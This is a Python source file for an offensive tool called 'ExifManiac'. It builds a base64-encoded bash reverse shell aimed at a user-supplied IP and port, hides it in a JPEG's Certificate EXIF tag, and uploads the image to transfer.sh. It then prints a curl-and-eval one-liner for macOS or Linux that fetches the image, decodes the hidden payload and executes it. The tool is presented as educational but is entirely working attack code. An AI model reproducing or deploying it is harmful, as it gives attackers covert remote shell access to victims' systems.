# -*- coding: utf-8 -*-
# Author: calfcrusher@inventati.org
from __future__ import absolute_import

import random
import string
import os
import lib.Cuteit as cit

from PIL import Image
from termcolor import colored
from pyfiglet import Figlet


def payload_generator(imageurl):
    """Generate oneliner post exploitation command"""

    print('\n')
    print(colored("[1] -> Generate oneliner for OSX", 'red'))
    print(colored("[2] -> Generate oneliner for LINUX", 'red'))

    # Asking for valid number
    while True:
        system = input("Type number: ")
        if not system.isnumeric():
            continue
        elif int(system) == 1 or int(system) == 2:
            break

    # Generate oneliner for OSX
    if int(system) == 1:
        osxpayload = "p=$(curl -s " + imageurl + " | grep Cert -a | sed 's/<[^>]*>//g' |base64 -d);eval $p"
        print('\n')
        print(colored("[*] OSX payload generated!", 'red'))
        print(osxpayload)
    # Generate oneliner for LINUX
    elif int(system) == 2:
        nixpayload = "p=$(curl -s " + imageurl + " | grep Cert -a | sed 's/<[^>]*>//g' |base64 -i -d);eval $p"
        print('\n')
        print(colored("[*] Linux payload generated!", 'red'))
        print(nixpayload)


def createpayload(ip, port):
    """Create base64 payload"""

    # Rewrite our ip in HEX (https://github.com/D4Vinci/Cuteit)
    hexip = cit.lib(ip)
    base64payload = os.popen("printf 'bash -i >& /dev/tcp/" + str(hexip) + "/" + port + " 0>&1' | base64 | tr -d '\n'").read()

    return base64payload


def insertpayload(payload, image):
    """Add metadata with exiftool"""

    os.system("exiftool -overwrite_original -Certificate='" + payload + "' " + image)


def uploadimage(file):
    """Upload image to transfer.sh free hosting service"""

    url = os.popen("curl -s --upload-file ./" + file + " https://transfer.sh/" + file).read()
    print('\n')
    print(colored("[+] Image uploaded!", 'red'))
    print(url)

    return url


def createimage():
    """Create random image"""

    charset = string.ascii_lowercase
    filename = ''.join(random.choice(charset) for i in range(5)) + '.jpg'
    width = 80
    height = 80
    img = Image.new('RGB', (width, height))
    img.save(filename)

    return filename


def main():
    """Main function of tool"""

    f = Figlet(font='larry3d')
    print(colored(f.renderText('ExifManiac'), 'green'), end='')
    print(colored("\tcalfcrusher@inventati.org | For educational use only", 'green'))
    print('\n')

    # Ask for ip and port
    ip = input("Enter IP: ")
    port = input("Enter port: ")

    # Create image
    filename = createimage()
    # Create payload
    payload = createpayload(ip, port)
    # Insert payload in metadata tag (Certificate)
    insertpayload(payload, filename)
    # Upload image
    urlimage = uploadimage(filename)
    # Remove image on hard disk
    os.system("rm " + filename)
    # Generate and output payload
    payload_generator(urlimage)


if __name__ == "__main__":
    os.system('clear')
    main()
    print('\n')
